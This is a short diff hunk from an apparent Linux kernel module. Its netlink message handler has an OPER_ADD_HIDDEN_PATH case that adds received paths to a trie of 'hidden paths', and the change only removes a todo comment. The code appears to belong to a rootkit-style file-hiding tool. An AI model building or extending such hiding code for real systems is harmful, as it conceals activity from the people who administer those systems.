@@ -36,7 +36,7 @@ void my_recv_msg(struct sk_buff *skb) {
             return;
         }
         case OPER_ADD_HIDDEN_PATH: {
-            add_word(trie, oper_data); // todo problem here
+            add_word(trie, oper_data);
             printk(KERN_INFO
             "add hidden path: %s\n", oper_data);
             break;
